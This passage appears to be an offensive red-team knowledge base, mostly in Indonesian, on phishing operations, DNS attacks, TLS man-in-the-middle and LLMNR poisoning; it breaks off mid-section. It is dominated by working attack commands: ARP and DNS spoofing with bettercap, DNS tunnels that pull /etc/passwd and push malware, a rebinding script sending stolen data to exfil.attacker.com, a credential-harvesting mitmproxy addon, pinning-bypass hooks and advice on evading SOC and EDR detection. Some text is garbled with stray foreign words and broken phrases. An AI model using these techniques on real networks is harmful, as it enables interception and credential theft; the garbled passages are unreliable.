4. **Bounce-back责任心.** 18% mark emails bounce bila target list stale. Sync list lewat OSINT just-in-time (LinkedIn, sharepoint), jam check.
5. **MFA push-not approve = user sleepy.** Jangan gunakan 1 tease. Use "validate" via legit app-path — bila organizational helpdesk standardnya call-in approach, tempel phishlet + vishing combo, phishlet-alone di security-mature org常常 akan disapproval.
6. **Unique campaign ID→anonymity destroy.** Bila GoPhish `{{.RId}}`/URL per-recipient tertangkap SOC, tracking path→ IOC→ IP → keseluruhan infra dof. Isolate phishing infra (separate VPS/email-separate domain notseen elsewhere) & carve takedown-sequence beforehand
7. **DMARC aggregate reports.** domain sending yang kita spoof terus-menerus mengirim report ke ISP → visible-warning email admin. Purpose-only `spf1 ~all` honest-self-hosted saat spoof internal domain.

## dns-attacks

# dns-attacks — net

# DNS Attacks — Referensi Teknik

## Daftar Isi
1. Cache Poisoning (Kaminsky & Bailiwick)
2. DNS Rebinding
3. DNS Tunneling (iodine, dnscat2)
4. Subdomain Takeover & Dangling CNAME
5. Zone Transfer (AXFR)

---

## 1. Cache Poisoning (Kaminsky & Bailiwick)

### Konsep
Resolver melakukan query rekursif → attacker berlajar mengirim respons palsu **sebelum** jawaban asli dari authoritative server tiba. Jika `TXID` dan `source port` cocok, resolver menerima jawaban palsu ke cache.

**Bailiwick rule**: Resolver hanya boleh menerima record dalam respons jika record tersebut **berada di zone yang sama dengan domain yang di-query**. Respons untuk `bank.com` boleh berisi record `bank.com`, tapi TIDAK boleh menyuntik `NS evil.com` untuk zone `bank.com` — modern resolver (BIND 9.5+, Unbound, dnsmasq 2.x) memfilter ini.

### Alur Serangan Kaminsky
```
1. Attacker → Resolver : Query a12345.bank.com (random subdomain)
2. Flood Resolver ← Attacker : Respons palsu (race condition) — dugaan TXID
   (dan dugaan source port jika random source port diaktifkan)
3. Respons asli → NXDOMAIN (subdomain tidak ada)
4. Jika respons palsu lolos terlebih dulu DAN berisi:
   - Authority: bank.com NS ns.attacker.com  → UNTUNG (baik sebelum RFC 2181 strict)
   - Additional: ns.attacker.com A 1.2.3.4   → poisoned glue
5. Repeat dengan subdomain random baru (cache NXDOMAIN tidak menghentikan race
   karena setiap query = race baru — inilah temuan inti Kaminsky 2008)
```

### Apa yang dikirim vs apa yang muncul
| Dikirim | Hasil sukses | Kenapa gagal |
|---|---|---|
| Respons UDP spoofed, TXID brute-force, random subdomain query | Cache resolver berisi A record attacker untuk domain target | Source port randomization (512+ port → ruim space 16+ bit), 0x20 encoding (case randomization di QNAME), DNSSEC validasi |

### Hardening (kenapa sering gagal di lapangan)
- **Source port randomization** — space pencarian jadi ~2^32; Kaminsky asli hanya viable melawan resolver dengan fixed port.
- **0x20 mixed-case** (BIND `dnssec-validation auto`, Unbound default): QNAME `WwW.BaNk.CoM` harus cocok case-nya.
- **DNSSEC** (`dig +dnssec bank.com` → cek `ad` flag) mematikan poisoning sepenuhnya.

### Tooling
```bash
# Cek apakah resolver rawan (fixed source port)
dig +short Chaos, TXT portpipe.arpa @8.8.8.8   # tidak relevan lagi, gunakan:
nmap -sU -p 53 --script dns-random-srcport <resolver>
nmap -sU -p 53 --script dns-random-txid <resolver>

# Simulasi Kaminsky: ettercap / bettercap MITM module
bettercap -iface eth1 -eval "set dns.spoof.domains victim.corp; dns.spoof on"
```
> Catatan: MITM-based spoofing (bettercap/ettercap) tidak perlu race condition — kamu berada di jalur dan drop respons asli. Ini realistis di engagement wifi/internal.

---

## 2. DNS Rebinding

### Konsep
Bypass Same-Origin Policy: domain publik yang di-resolve ke IP attacker (server web jahat), lalu setelah TTL habis di-resolve ke IP internal (mis. `192.168.1.1`, `127.0.0.1`). Browser menganggap still origin sama (nama domain sama), JS attacker dapat fetch ke endpoint internal.

### Flow
```
T=0    Browser → DNS : rebinder.attacker.com → 5.6.7.8   (server evil, TTL=1s)
T=0    Browser load halaman evil, JS menunggu
T=2s   JS fetch("http://rebinder.attacker.com:8080/admin")
T=2s   Browser → DNS : rebinder.attacker.com → 192.168.1.1  (IP internal)
T=2s   Request JS berangkat ke target internal — SOP terpenuhi karena hostname sama
```

### Apa yang dikirim vs hasil
| Dikirim | Hasil sukses | Kenapa gagal |
|---|---|---|
| Halaman HTML+JS luring, DNS record yang berganti IP setelah TTL | Baca response router/produk internal (admin panel, metadata), kirim ke attacker | Chrome/Edge/Firefox modern memblokir IP publik → IP privat pada **nama yang sama** (Chrome ≥ 58: `Block insecure private network requests`); **DNS caching browser** abaikan TTL kadang-kadang; koneksi keep-alive reuse IP lama |

### Tool: singularity
```bash
singularity-server --host 0.0.0.0 --port 8080
# Rebind URL otomatis dipetakan, contoh:
# http://7f000001.1.2.3.4.rebind.network:8080/  → 127.0.0.1 lalu 1.2.3.4
# Format: <hex-first-ip>.<ip-second|hostname>.rebind.network

# Payload JS page (rebind.html):
fetch("http://victim.rebind.network:8123/admin/config")
  .then(r=>r.text()).then(t=>fetch("http://exfil.attacker.com/?data="+btoa(t)))
```

**Otorisasi penting**: user **harus** mengunjungi domain attacker terlebih dahulu (phishing link) atau target internal melakukan render HTML ke URL yang dikontrol (SSRF → rebinding).

### Blokir modern (Chrome 131+, Windows 11 24H2 realm)
- **PNA (Private Network Access)** Chrome: preflight `Access-Control-Request-Private-Network: true` sebelum konteks publik → privat. Target internal tanpa header `Access-Control-Allow-Private-Network: true` = ditolak.
- Solusi attacker: **rebinding publik→publik** (EC2 → EC2 internal), atau HTTPS pada quoted (umumnya internal tools adalah HTTP plain — tapi HTTPS berarti origin network mismatch, kecuali IP publik target tetap).

---

## 3. DNS Tunneling (iodine, dnscat2)

### Konsep
Encode data dalam label QNAME → transaksi DNS ke nameserver yang attacker kontrol (NS untuk zone tunnel.attacker.com). Bypass captive portal / egress filter yang hanya izinkan DNS (UDP/TCP 53).

### Iodine (0.8.0)
```bash
# Server (VPS, NS dari zone tunnel.example.com, NS record mengarah ke VPS):
sudo iodined -f -c 172.16.0.1 tunnel.example.com -P password123

# Klien (di jaringan victim):
sudo iodine -f -P password123 tunnel.example.com
# Hasil: interface TUN, IP 172.16.0.x, MTU default 1130
ping 172.16.0.1        # berjalan lewat ICMP-over-DNS
ssh user@172.16.0.1

# Pilih encoding terbaik secara otomatis:
# Test baseline kecepatan: iodine melakukan handshake mode raw/base64/base32/base128
# Non-optimal bila DNS : 16 kbps (base32, 3 label warn/counter)
```

| Yang dikirim | Yang muncul |
|---|---|
| QNAME berisi `data` encoded, mis. `kvj23kj.example.com` | Traffic UDP 53 banyak ke NS attacker — terlihat sebagai "DNS flood ke satu domain" di SIEM |
| Null record / TXT untuk upstream | Registrator/ ISP menyari recursive traces |

### dnscat2
```bash
# Server:
ruby dnscat2.rb tunnel.example.com --secret=abc123

# Klien (victim, jika ada binary execute):
./dnscat tunnel.example.com --secret abc123
# download/exec opsional via nt/vps shell — hanya Java+native or reverse TCP via tunnel
# dnscat2 mode C2 messages, perintah interaktif:
#   window -i 1            → masuk session shell
#   download /etc/passwd
#   upload malware.exe
# Standard mode (DNS server controlled) vs relay mode (public DNS choice)
```

**dnscat2 dari PowerShell (undetectable via system-trusted "nslookup" style)**:
```powershell
# dnscat2-powershell: 
Import-Module .\dnscat2.ps1
Start-DNSCat2 -DNS tunnel.example.com -PreSharedKey abc123 -Exec
```

### Kenapa gagal
| Penyebab | Gejala |
|---|---|
| Recursive-only resolver (hanza ISP memaksa forwarder) | Query tidak pernah sampai ke NS attacker |
| DNS filtering (Cisco Umbrella, fw DNS inspection) | Domain .com baru tanpa reputasi → drop/sinkhole |
| Hanya TCP 53 diperbolehkan | UDP 53 diblokir → iodine pakai `iodine -T` (opaque/tunnel over TCP 53), dnscat2 pakai `--dns tcp` |
| Latensi tinggi (empty domain, banyak label overhead) | Throughput <10 kbps — tidak layak untuk streaming |

---

## 4. Subdomain Takeover & Dangling CNAME

### Konsep
CNAME `sub.victim.com` → resource SaaS (Heroku, GitHub Pages, Azure) yang sudah dihapus deprovision, tapi DNS record jangut dibiarkan. Attacker mere-claim resource tersebut → content attacker melayani di `sub.victim.com`.

### Flow umum
```
1. Victim: sub.victim.com CNAME victim-app.herokuapp.com
2. Victim hapus Heroku app → CNAME tetap (dangling)
3. Attacker: heroku create victim-app   (nama identik, jika tersedia)
4. Attacker deploy halaman / phishing / cookie-stealer JS
5. Pengunjung sub.victim.com → menerima halaman attacker,
   dengan HTTPS via cert *.victim.com bila provided/Cloudflare custom cert
```

### Enumerasi (kondisi takeover untuk provider umum)
| Provider (fingerprint response) | Ambil-alih jika |
|---|---|
| Heroku (`No such app` + `herokucdn.com error`) | `heroku apps:create victim-app` |
| GitHub Pages (`404 There isn't a GitHub Pages site here`) | Buat repo bernama `victim.github.io` → aktifkan Pages, custom domain = sub.victim.com |
| Azure Cloud (awverify / `404 Web Site not found` di azurewebsites.net) | Buat web app name sama; butuh verifikasi TXT `msverify` di beberapa case |
| AWS S3/CloudFront (`NoSuchBucket`) | `aws s3api create-bucket --bucket victim-bucket` — lalu `aws s3 website` |
| Pantheon/Readme/Zendesk | Buat situs dengan nama sama & verifikasi domain |

### Tooling
```bash
# Enumerasi CNAME subdomain:
subfinder -d victim.com -silent | dnsx -cname -resp -silent

# Cek dangling terhadap 1400+ provider signature:
nuclei -l subdomains.txt -t takeovers/

# /etc/hosts tidak perlu; formulas PV di dasbor subzy:
subzy run --targets subdomains.txt --hide_frequent

# Manual:
dig +short CNAME sub.victim.com
dig +noall +answer victim-app.herokuapp.com   # "No such app" = terbuka
```

| Yang dikirim | Yang muncul |
|---|---|
| CNAME enumeration → HTTP GET pada subdomain → match error-location signature | Sink space kosong (Nama resource tersedia untuk claim) → takeover berhasil |
| Record diproteksi (TXT verifikasi custom domain mandatory) | `domain_verified` token tidak dimiliki attacker → takeover gagal |

---

## 5. Zone Transfer (AXFR)

### Konsep
AXFR menyalin semua record zone dari authoritative server. Admin master→slave replication; jika world-readable, attacker mendapat **peta internal lengkap** (subdomain, host internal, MX, internal IP).

### Perintah
```bash
# Identifikasi NS:
dig +short NS victim.com

# Coba AXFR terhadap semua NS:
for ns in $(dig +short NS victim.com); do dig AXFR victim.com @$ns | head -50; done

# Host di jaringan internal (AD Integrated Zones):
host -t NS corp.victim.local; dig AXFR corp.victim.local @10.0.0.53

# Tool otomatis:
dnsrecon -d victim.com -t axfr
nmap --script dns-zone-transfer -p 53 <ns-ip>
fierce --domain victim.com --dns ns1.victim.com
```

### Yang dikirim vs yang muncul
| Dikirim | Muncul |
|---|---|
| `dig AXFR zone @ns` — TCP 53, query type 252, ` stev`: `AXFR` respon berisi seluruh RR dalam stream multi-packet | Seluruh RR; atau `Transfer failed` / REFUSED (default modern BIND `allow-transfer { none; };`) |

**Kenapa gagal**: BIND 9 modern, Windows Server 2019+ DNS (AD-integrated zone default hanya `secure dynamic` antar DC), dan PowerDNS menolak unless ACL. Zone transfer success di 2024 umumnya **secondary/forgotten NS** (old Ubuntu BIND 9.11 dengan `allow-transfer { any; };` lama) atau **internal-only ns di jaringan pivot** — gunakan setelah foothold internal via SOCKS proxy `proxychains dig AXFR ...`.

---

## Jebakan Operasional (kenapa teknik ini gagal di lapangan)

### Umum
1. **DNS caching di OS & aplikasi** — Windows (`ipconfig /displaydns`), systemd-resolved, container `/etc/resolv.conf` menyimpan TTL lebih lama dari query: payload poisoning/rebinding berhenti setelah hasil pertama. Selalu `ipconfig /flushdns` sebelum perekaman.
2. **Resolver internal korporat melakukan sink untuk external domain yang tidak terwhitelist** (Cisco Umbrella, Infoblox RPZ): sinkhole. Tunnel jadi dibatasi QPS policy; generator bisa didrip-feed mimik interval normal).
3. **CDN/Full-proxy (Cloudflare) berada di depan** — attacking domain via rebinding/takeover tertutup oleh Cloudflare orange-cloud proxy (A rec pointing CF IP; tidak terlihat record origin).
4. **IPv6 / dual-stack**: browser mendukung Happy Eyeballs, memilih AAAA — rebinding ke IPv4 loopback gagal karena target IPv6 via terlupakan record AAAA juga.

### Khusus per teknik
5. **Kaminsky**: source-port randomization (patch 2008) membuat race infeasible di internet public; hanya berjalan dalam skenario MITM jaringan lokal atau resolver legacy (embedded IoT, router SOHO dengan dnsmasq versi lama — cek versi `dnsmap`). Dan DNSSEC di resolver big-4 (Cloudflare `1.1.1.1`, Google `8.8.8.8`) usai cuckoo validated.
6. **Rebinding**: PNA/CFR Chrome 131+ men-blocking request ke target private network dari public context, kecuali target merespon preflight — jarang aplikasi legacy internal implementasi header `.cainfriend`. **Operasional workaround**: attack publik↔publik, atau internal test di browser Firefox Legacy/Chrome versi enterprise yang dinon-disable flag.
7. **Tunnel**: enterprise menggunakan DNS over ping (DoT:853, DoH) blocker; kernel iodine yang membangun banyak koneksi dari satu domain berterting mastak SMP; latency per-fragmen 1.5-3s membuat interaksi SSH lagging mematikan di cross-testing. Test MSF `auxiliary/server/iodine` di lab dulu, pilih `dnscat2` untuk C2 yang lebih stabil.
8. **Subdomain takeover**: verifikasi **txt record sebelum deploy** (`_verify` / `github-challenge-xxx`) dan sink domain verifikasi (mis. Azure `cdnverify`) yang tidak dimiliki attacker adalah penyebab ~40% false positive scanner. Nuclei signature outdated dibanding nuance provider baru: selalu verifikasi manual `dig TXT _gh-victim.victim.com` versi terbaru sebelum klaim vuln.
9. **Zone transfer**: banyak klien menonaktifkan AXFR untuk internet tapi lupa meng-enable di interface peer-master lokal—AXFR hanya valuable setelah pivot; negative scan dari luar tidak menyimpulkan instalasi internal zone security.
10. **DNSSEC**: kunci RRSIG peak op — jika zone victim ditandatangani dan resolver melakukan validasi, semua injeksi payload (poisoning, fake response via tunnel server) gagal signature check. Cek `dig +dnssec +multiline domain` (`ad flag`) sebelum invest effort race.


## mitm-tls

# mitm-tls — net

# Referensi Teknik: TLS MITM (Network-Level)

Status: Internal Red Team KB | Target env: jaringan korporat tipikal (L2 shared, 802.1X jarang di segmen user/guest)

---

## 1. Skenario & Prasyarat

| Komponen | Minimum |
|---|---|
| Posisi | Same L2 segment dengan target (atau gateway path) |
| Tooling | Linux attacker box (Ubuntu 22.04/24.04), nftables, `net.ipv4.ip_forward=1` |
| Syarat keberhasilan MITM | ARP spoof **ataau** router path control **atau** captive/transparent proxy |
| Kegagalan umum | DHCP snooping + Dynamic ARP Inspection (DAI) di switch Cisco/Juniper → spoofed GARP didrop |

---

## 2. ARP Spoofing + IP Forwarding

### 2.1 Apa yang dikirim / terjadi

- Attacker mengirim gratuitous ARP reply: "IP gateway → MAC attacker" ke korban (dan sebaliknya ke gateway) — rate ~1 paket/detik agar tabel ARP korban tetap teracuni.
- Kernel `ip_forward=1` + rule NAT membuat attacker jadi transparant router (bukan sekadar sniffer).
- **Yang muncul:** semua trafik korban lewat attacker; `tcpdump -i eth0 host <korban>` menunjukkan full stream HTTP, TLS handshake (SNI terlihat), metadata DNS.

### 2.2 Perintah

```bash
# Persiapan kernel
sudo sysctl -w net.ipv4.ip_forward=1

# bettercap 2.35.x — one-liner
sudo bettercap -iface eth0 -eval "set arp.spoof.targets <IP_KORBAN>; arp.spoof on"

# Manual arpspoof (dsniff package)
sudo arpspoof -i eth0 -t <IP_KORBAN> <IP_GATEWAY>
sudo arpspoof -i eth0 -t <IP_GATEWAY> <IP_KORBAN>

# Pastikan forwarding + tidak kena ICMP redirect (korban bisa cek)
sudo sysctl -w net.ipv4.conf.all.send_redirects=0
```

### 2.3 Kenapa berhasil/gagal

- **Berhasil:** kebanyakan jaringan flat, Wi-Fi guest, NIC tidak cek GARP cross-check.
- **Gagal:** DAI/DHCP snooping (Cisco `ip arp inspection`), 802.1X dengan MAB isolasi port, wireless client isolation, korban pakai IPsec/L2TP yang pin gateway MAC, IPv6 (butuh NDP spoof — Slirp/gratuitous NA, tooling lebih terbatas: `bettercap` punya `ndp.spoof on` untuk IPv6, perhatikan korban macOS/iOS yang prefer IPv6).

---

## 3. SSL Stripping

### 3.1 Mekanisme

- Korban request `http://example.com` → attacker downgrade/proxy → attacker sendiri akses HTTPS → balas plaintext ke korban.
- **Yang muncul di tool:** kredensial POST di log proxy dalam plaintext.

```
Korban ──HTTP──▶ Attacker (stripping) ──HTTPS──▶ Server
```

### 3.2 Perintah

```bash
# bettercap
sudo bettercap -iface eth0 -eval "
  set arp.spoof.targets <KORBAN>;
  set http.port 8080;
  set https.port 8443;
  set http.proxy.sslstrip true;
  arp.spoof on;
  http.proxy on;
  set events.stream.output /tmp/creds.log"

# mitmproxy: legacy addon mode (v10.x masih mendukung via addon custom)
# Intinya: listener di :80 yang redirect-link href http:// → https://
mitmproxy --mode reverse:http://target.example.com@8080
```

### 3.3 Kenapa gagal di 2024/2025

| Penyebab | Penjelasan |
|---|---|
| HSTS | Browser (Chrome 131, Firefox 133) hardcode/learned HSTS → auto upgrade `http→https` sebelum request keluar. Website besar hampir 100% covered. Hanya target internal/legacy yang masih vulnerable. |
| HTTPS-Everywhere bawaan (Chrome "Always Use Secure Connections", default *off* tapi often enforced by policy) | Upgrade di browser level. |
| User bookmark/typing `https://` | Trivial tapi sering overlooked. |

**Gunakan stripping hanya pada:** app legacy, embedded device, subdomain internal tanpa HSTS, atau dikombinasikan dengan sesi hijack (cookies yang tidak ber-flag). `sslstrip2`/`sslstrip+` (domain fronting via subdomain wildcard/xip.io pernah sunset — tidak reliable lagi; DNS wildcard sendiri masih bisa: `*.a.attacker.com → attacker`, combine dengan `dns.spoof` bettercap).

---

## 4. HSTS Bypass

| Teknik | Proses | Status |
|---|---|---|
| HSTS cache notary (sslstrip2) | Register wildcard `www.*.tld` via DNS wildcard to attacker, host HTTPS on attacker per-host | Sering gagal — browser modern validasi cert per-subdomain; hanya berhasil kalo ada cert wildcard yang bisa attacker minta |
| Remove HSTS header (bukan bypass) | Kalau origin sendiri tidak kirim HSTS pada first-ever visit → target "clean" tidak ada di HSTS preload | Peralatan: nmap script `http-security-headers`, atau `curl -sI` manual |
| Cookie injection/fixation post-strip | Set cookie `Secure; SameSite=None` via stripped page | Bekerja untuk session hijack HTTP side |
| Internal CA proxy (corporate TLSI) | Corporate middlebox sudah install root cert di host korban semua client | Serang itu: test apakah ada corporate CA (misal, qemu/*.pem di OS trust store) — **see section 5** |
| Del HSTS memory via browser exploit/tool | `certutil` (Linux/Chrome HSTS DB: via `chrome://net-internals/#hsts` sebelum dihapus di release baru) | Restore util di `chrome://net-internals` sudah deprecated Chrome >=100 |

**Perintah cek HSTS korban-affecting:**
```bash
curl -sI https://sub.domain.tld | grep -i strict-transport
# 0> no preload di hstspreload.org
curl -s https://hstspreload.org/api/status?domain=sub.domain.tld
```

**Realistic play:** SSLS strips sudah jarang berhasil untuk situs login; fokus ke **persi (non-HSTS subdomain)** — static assets, API v1, tracking pixel — token jarang bind ke Origin.

---

## 5. Bypass Certificate Pinning

### 5.1 Desktop (Windows 11 24H2 / Chrome 131 / Edge / Firefox)

| Target | Metode |
|---|---|
|.Chrome 131 (not pining aware by default) | Install root CA di Windows trust store (machine) `certutil -addstore -f Root ca.pem` atau `Import-Certificate -FilePath ca.pem -CertStoreLocation Cert:\LocalMachine\Root` → TLSI via mitmproxy full port. Chrome automatically trusts Windows store |
| Firefox (NSS, custom trust store) | Nav `about:preferences#privacy` import CA, or write `cert9.db`. Firefox juga option `security.enterprise_roots.enabled=true` |
| Electron app (Electron ≥ 20) | Env var: `--ignore-certificate-errors` pada start (headless Chrome switches jalan di Electron) |
| App native dengan pinning (mis. Signal desktop) | Perlu patching binary: Frida di desktop (`frida -l bypass.js -p <pid>`) hook `SSL_CTX_set_verify` / Java `X509TrustManager` |

**Payload template (bypass pinning via env var / cmdline):**
```powershell
# List cert thumbprint untuk cari corporate CA (mitigation)
Get-ChildItem Cert:\LocalMachine\Root | Format-List Subject, Thumbprint, NotAfter

# Chrome tanpa pinning-check on dev flag (internal testing API)
& "C:\Program Files\Google\Chrome\Application\chrome.exe" --ignore-certificate-errors --host-rules="MAP * localhost,443"
```

**Kenapa berguna/gagal pada desktop:**
- Browser desktop per se tidak pin situs umum (hanya Google sites pakai Dynamic Pinnetvariants/CT). MITM via trusted CA bekerja-banyak produk (99% kebanyakan).
- Gagal: SSP/hard-pinned products (mis. Payroll client industri, beberapa banking app native Windows), .NET apps menggunakan certificate pinning hardcoded.

### 5.2 Mobile

| Platform | Teknik | Perintah/Tool |
|---|---|---|
| Android ≥ 7.0 (API 24+) | System trust store (user CA default not trusted) → butuh **root** atau **repackage APK** dengan `network_security_config.xml` trust user CA + re-sign + bypass `signature check` | `objection patchapk -s app.apk` (objection 1.11.x, automagically: apktool disassemble, inject nsconfig, zipalign, sign) |
| Android dengan root (magisk, superuser) | Install CA di system store + Magisk "MagiskTrustUserCerts" module, plus Zygisk DenyList untuk bypass Play Integrity | `adb root; mount -o rw,remount /system` copy cert ke `/system/etc/security/cacerts/`, chmod 644 |
| Android ROOT + Frida (runtime bypass) | Hook `SSLContext`, `okhttp3.CertificatePinner.check$okhttp`, TrustManagerImpl | `objection -g com.app explore --startup-command "android sslpinning disable"` atau `frida -U -f com.app -l universal-bypass.js` (objection's `android sslpinning disable` cukup umum) |
| Flutter app (dio/http_client, BoringSSL statically linked) | Standar Frida universal script gagal (bukan Java TLS) — hook `ssl_verify_result` di libflutter.so; offset per-binary | Tools `reFlutter` (patch flutter engine) — `reflutter app.apk` |
| iOS (14–18.x) | Jailbreak+Sileo SSL Kill Switch 3 (iOS ≤ 16.x support) / Frida IPA-patch | `objection patchipa` / iProxy/Sileo install SSLKillSwitch3; iOS 17.x perlu palera1n/roothide |
| WebView-based app + Network Security Config default | Sani tanpa pinning → cukup root CA di system store | as above |

**Payload inti: `universal` Frida SSL bypass (okhttp pinning):**
```javascript
// okhttp3 CertificatePinner bypass (Java-based Android app)
Java.perform(function() {
    var pin = Java.use('okhttp3.CertificatePinner');
    pin.check.overload('java.lang.String', 'java.util.List').implementation = function(a, b) {
        console.log('[*] Bypass pinning: ' + a);
        return;
    };
});
```

**Note speed:** untuk tidak usah root/patched-cert: `objection explore` + command `android sslpinning disable` hook runtime tanpa repackage — cukup kalau Frida gadget injection berhasil via patched APK.

### 5.3 Root CA generation (untuk semua arsitektur MITM)

```bash
# mitmproxy auto-generate: ~/.mitmproxy/mitmproxy-ca-cert.pem
# bettercap: set http.proxy.ssl true (buat sendiri CA)
# Custom openssl:
openssl req -x509 -newkey rsa:4096 -keyout ca.key -out ca.pem -days 10365 -nodes \
  -subj "/CN=Corp Intermediate CA/O=Corp IT"

# Android hash-nama file (system store requires md5-of-DN filename)
openssl x509 -inform PEM -subject_hash_old -in ca.pem | head -1   # mis. c8450d0d
cp ca.pem c8450d0d.0
```

## 6. Transparent Proxy (mitmproxy & bettercap)

### 6.1 Apa yang dikirim / muncul

- Tidak perlu klien setting proxy: intercept via iptables REDIRECT (TPROXY optional) semua TCP:80/:443 ke listener.
- Full TLS MITM kalau CA trusted (section 5): **yang muncul** di `mitmproxy`/web UI: full decrypted HTTP flow, request/response body, WebSocket, HTTP/2 (mitmproxy ≥ 10 support HTTP/2 & ALPN negotiation).
- Tanpa CA trusted: SSL passthrough mode — hanya SNI/Host enrichment (domain, tanpa decrypt).

### 6.2 MITMproxy (v10.x, v11)

```bash
# Generate CA pertama kali run: ~/.mitmproxy/mitmproxy-ca-cert.cer
sudo sysctl -w net.ipv4.ip_forward=1

# Mode transparent (iptables redirect manual di Linux)
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8443
mitmproxy --mode transparent --showhost

# Web UI + scripting addon
mitmweb --mode transparent -s rewrite_tokens.py

# Cluster modus reverse (one target)
mitmproxy --mode reverse:https://target.example.com@8443

# TPROXY (advanced, preserves source IP)
sudo mitmproxy --mode transparent@9090 --set connection_strategy=lazy
# + iptables mangle mark rule (see mitmproxy docs)
```

**Mitmdump automation (harvest creds/token):**
```bash
mitmdump --mode transparent -s creds.py --set hardump=creds.txt
```
```python
# creds.py
from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
    if "token" in flow.response.text or "password" in flow.request.get_form_full():
        with open("creds.txt","a") as f: f.write(f"{flow.request.pretty_url}\n{flow.request.get_text()}\n---\n")
```

### 6.3 bettercap (v2.35+)

```bash
sudo bettercap -iface eth0 -eval "
  set arp.spoof.targets <KORBAN>;
  set net.sniff.local false;
  arp.spoof on;

  # HTTP(S) MITM dengan CA auto
  set http.proxy.ssl true;
  set http.proxy.address 0.0.0.0;
  set http.proxy.port 8080;
  set https.proxy.port 8443;
  http.proxy on;
  https.proxy on;

  # DNS spoof untuk redirect domain → attacker
  set dns.spoof.addresses <IP_ATTACKER>;
  set dns.spoof.domains login.target.com,*.target.com;
  dns.spoof on;

  # Harvest
  set events.stream.output /tmp/bcap-events.log"

# Sniffer-only mode
sudo bettercap -eval "set arp.spoof.targets <KORBAN>; arp.spoof on; net.sniff on"
```

Screenshot/operator live flow:
```
bettercap -caplet http-ui  # (caplet http-ui includes REST + web UI on :80/--api Port 8084)
```

### 6.4 Nginx 1.25 sebagai SSL passthrough front / redirect (goldplating)

```nginx
# /etc/nginx/nginx.conf - stream module (for port-based pass-through)
stream {
    map $ssl_preread_server_name $backend {
        target.example.com  127.0.0.1:8443;
        default             127.0.0.1:9443;
    }
    server {
        listen 443;
        ssl_preread on;
        proxy_pass $backend;
    }
}
```

---

## 7. Jebakan Operasional (Field Notes)

| # | Jebakan | Gejala | Workaround |
|---|---|---|---|
| 1 | **DAI / DHCP snooping di switch** | GARP didrop, ARP tabel korban tidak berubah, MITM berhasil setelah beberapa jam tapi korban kelihatan offline atau speed drop detak | Nyalakan bettercap `set arp.spoode.internal false` agar tidak double GARP; jika masih drop, switching metode → intercept via rogue AP/DHCP + default gateway injection |
| 2 | **IPv6 SLAAC/RA diabaikan** | TCPdump menunjukkan korban tidak lewat attacker, paket makin sedikit dan routing via RA ketiga | `ndp.spoof on` atau `sysctl net.ipv6.conf.all.forwarding=1` + NAT66 |
| 3 | **Static ARP entry / Proxy ARP** | Beberapa sino endpoint security (falcon, trend micro) pin MAC gateway inisialisasi + detect GARP | Pindah ke rogue AP scenario, atau spoof endpoint lain |
| 4 | **Windows корпоративная TLSI**
Corporate middlebox mencegat dulu | Korban sudah pernah MITMed oleh middlebox korporat (misal Netskope, Zscaler) | Korban akan reject CA attacker atau cert chain menunjukkan Netskope/Zscaler/Zscaler root sudah ada di store; sinyal perlu attack vector lain (payload implant m lebih mudah) |
| 5 | **Cert transparency / dual-source check** | Users melihat "Cert blocked" di aplikasi (mis. beberapa aplikasi banking di Android saat ini sudah feature detection + tamper check) | hook lebih dalam (Frida bypass tamper-test), atau tidak usah eascape ke session theft via Cookies/HTTP plaintext sendiri |
| 6 | **mitmproxy crash + raw socket FD leak** | setelah beberapa jam & beberapa ribu flow, dedicated proxy PID membesar dan lag di throughput — bukan bug yang selesai, tapi makin mahal capture | gunakan `--set connection_limit=...` + restart via systemd setiap N jam, log rotate mem flow) |
| 7 | **QUIC / HTTP3 (UDP 443)** | Browser Chrome 131, Microsoft Edge mencoba QUIC → tidak lewat TCP iptables redirect → valid connection masih established (Connection Coalescing), traffic hilang overlap | `iptables -A FORWARD -p udp --dport 443 -j DROP` → paksa fallback ke TCP TLS |
| 8 | **Wireless client isolation** | ARP spoof tidak pernah sampai; antar-client di SSID guest/corp tidak bisa berkomunikasi | Rogue AP (hostapd +, wpa_sycophant/Evilginx style phishing AP) |
| 9 | **Cert pinning dengan tamper detection (Flutter, Go binary)** | App crash immediately after hook attach, **atau silently exit** tanpa error | Use `reFlutter` (compiled flutter), atau hook `crypto/tls` verify di `libgo` binary (firda-gum native lib, path PSK-po |
| 10 | **Async ip_forward + ICMP redirect leak** | Korban kirim ICMP redirects; tracert reveals attacker hop; trigger IDS | `sysctl net.ipv4.conf.all.send redirects=0` **waajib**, plus bettercap's set `arp.spoof silent` di 2.35 |
| 11 | **HSTS for first-visit, but preload list** | `curl -i` menunjukkan site HSTS `includeSubDomains preload`, tapi ada subdomain tanpa HSTS | Attack subdomain; jadikan domain token/cookie scope-wide untuk hijack session |
| 12 | **Endpoint detection of GARP flood** (CrowdStrike Falcon, SentinelOne 24.x) | Some EDR detect gratuitous ARP rate & MAC conflict signals → **SOC alert** louder than necessary | Rate-limit GARP (bettercap: `set arp.spoof.interval 30`), atau target host SPESIFIK saja, non-network-wide |
| 13 | **Session resumption / 0-RTT bypass chance** | Menggunakan TLS 1.3 session resumption tickets pada penerima untuk resume session; beberapa perangkat mungkin skip pinning validation on resumption | Keep mitmproxy instance persistent (pause), don't rekey if unnecessary — no |

## 8. Quick Decision Matrix

| Situasi | Tool | Chances |
|---|---|---|
| L2 flat network, korban Windows/macOS browser | ARP spoof + mitmproxy transparent + trusted CA (via payload or user interaction) | High |
| Wireless isolated | Rogue AP | Medium |
| Pinned mobile app | Frida (rooted/jailbroken) atau patch APK/IPA with embedded CA | Medium-High but time |
| Corporate TLSI already present (Zscaler/Netskope) | Attack session post-decryption, atau fokus on plaintext HTTP/cookie hijack | Limited |
| QUIC/HTTP3 era | Block UDP 443, force TCP fallback | High efficacy |

## 9.1 LLMNR/NBT-NS Poisoning — Responder

### Mekanisme
Windows 11 24H2 masih mengirim LLMNR (UDP 5355) dan NBT-NS (UDP 137) query untuk hostname yang tidak resolve via DNS. Responder memalsukan jawaban, korban mengirim NTLMv2 hash ke host kita.

Perintah:
```bash
sudo responder -I eth0 -dvw
# -d  = enable answers for DHCP
# -v  = verbose
# -w  = enable WPAD rogue auth
sudo responder -I eth0 -A   # 分析 mode (passive, tanpa poison)
```

### Apa yang dikirim
- LLMNR response UDP 5355 → A record menunjuk IP kita
- NBT-NS response UDP 137 → NB record
- mDNS respon UDP 5353 (hostname.local)

### Apa yang muncul
```
